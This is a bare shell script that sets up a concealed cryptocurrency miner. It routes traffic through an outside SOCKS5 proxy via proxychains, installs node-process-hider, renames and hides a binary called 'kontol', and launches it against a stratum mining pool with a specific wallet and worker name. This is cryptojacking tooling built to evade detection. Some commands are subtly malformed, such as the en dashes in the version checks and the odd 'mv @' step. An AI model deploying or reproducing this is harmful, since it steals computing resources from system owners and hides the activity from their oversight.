apt update 
apt install proxychains  -y 
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
apt install nodejs -y
node –version
apt install npm -y
npm –version 
npm i -g node-process-hider
mv @ kontol
chmod u+x kontol
ph add kontol
./kontol -a phichox  -o stratum+tcps://stratum-asia.rplant.xyz:17031 -u 5k79hkxcQ7axQGBgKjLTdeAQvEA9iPCNv8.BAKULKULI -t20
